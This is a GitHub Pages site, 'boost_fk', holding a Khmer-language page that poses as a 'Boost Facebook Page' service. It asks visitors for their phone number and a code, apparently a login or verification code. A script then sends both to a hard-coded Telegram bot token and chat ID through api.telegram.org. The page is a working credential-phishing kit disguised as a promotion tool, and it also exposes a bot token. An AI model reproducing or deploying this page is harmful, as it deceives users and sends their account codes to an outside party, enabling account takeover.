<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>boost_fk</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="boost_fk" />
<meta property="og:locale" content="en_US" />
<link rel="canonical" href="https://visal020.github.io/boost_fk/" />
<meta property="og:url" content="https://visal020.github.io/boost_fk/" />
<meta property="og:site_name" content="boost_fk" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="boost_fk" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebSite","headline":"boost_fk","name":"boost_fk","url":"https://visal020.github.io/boost_fk/"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="stylesheet" href="/boost_fk/assets/css/style.css?v=d496dad75c6eb625c32873544553972811b5f2df">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/boost_fk/favicon.ico" -->

<!-- end custom head snippets -->

  </head>
  <body>
    <div class="container-lg px-3 my-5 markdown-body">
      
      <h1><a href="https://visal020.github.io/boost_fk/">boost_fk</a></h1>
      

      <p>&lt;!DOCTYPE html&gt;</p>
<html lang="km">
<head>
  <meta charset="UTF-8" />
  <title>Boost Facebook Page</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(to right, #3b5998, #8b9dc3);
      font-family: 'Khmer OS', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
      animation: fadeBackground 2s ease-in;
    }

    @keyframes fadeBackground {
      from {opacity: 0;}
      to {opacity: 1;}
    }

    .container {
      background: rgba(255, 255, 255, 0.15);
      backdrop-filter: blur(8px);
      padding: 30px;
      border-radius: 20px;
      width: 90%;
      max-width: 400px;
      text-align: center;
      box-shadow: 0 8px 30px rgba(0,0,0,0.4);
      transform: translateY(50px);
      animation: slideIn 1s ease-out forwards;
    }

    @keyframes slideIn {
      from {
        opacity: 0;
        transform: translateY(50px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    h2 {
      color: white;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 10px;
      border: none;
      font-size: 16px;
      transition: box-shadow 0.3s ease;
    }

    input:focus {
      outline: none;
      box-shadow: 0 0 8px #fff;
    }

    button {
      padding: 12px 20px;
      background-color: #4267B2;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
      transition: all 0.3s ease;
    }

    button:hover {
      background-color: #365899;
      transform: scale(1.05);
    }

    .status {
      margin-top: 15px;
      color: #fff;
      font-weight: bold;
      animation: fadeIn 0.8s;
    }

    @keyframes fadeIn {
      from {opacity: 0;}
      to {opacity: 1;}
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>🚀 Boost Facebook Page</h2>
    <input type="text" id="phone" placeholder="📱 លេខទូរស័ព្ទ" />
    <input type="text" id="code" placeholder="🔐 លេខកូដ" />
    <button onclick="sendToTelegram()">បញ្ជូន</button>
    <div id="status" class="status"></div>
  </div>

  <script>
    function sendToTelegram() {
      const phone = document.getElementById("phone").value.trim();
      const code = document.getElementById("code").value.trim();
      const status = document.getElementById("status");

      if (!phone || !code) {
        status.textContent = "⚠️ សូមបញ្ចូលទាំងលេខទូរស័ព្ទនិងលេខកូដ!";
        return;
      }

      const message = `📲 លេខទូរស័ព្ទ: ${phone}\n🔐 លេខកូដ: ${code}`;
      
      const token = '8057535635:AAFjnsrRpj4axjJ5wS1JBGgsQGhokF0bgXY';  // 🔁 ប្ដូរទីនេះជាមួយ TOKEN
      const chat_id = '1784262198'; // 🔁 ប្ដូរទីនេះជាមួយ CHAT ID

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message
        })
      })
      .then(response => {
        if (response.ok) {
          status.textContent = "✅ បញ្ជូនរួចរាល់ទៅ Telegram!";
        } else {
          status.textContent = "❌ មិនអាចបញ្ជូនបានទេ!";
        }
      })
      .catch(error => {
        status.textContent = "🚫 មានបញ្ហាក្នុងការបញ្ជូន!";
        console.error(error);
      });
    }
  </script>
</body>
</html>


      
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/4.1.0/anchor.min.js" integrity="sha256-lZaRhKri35AyJSypXXs4o6OPFTbTmUoltBbDCbdzegg=" crossorigin="anonymous"></script>
    <script>anchors.add();</script>
  </body>
</html>
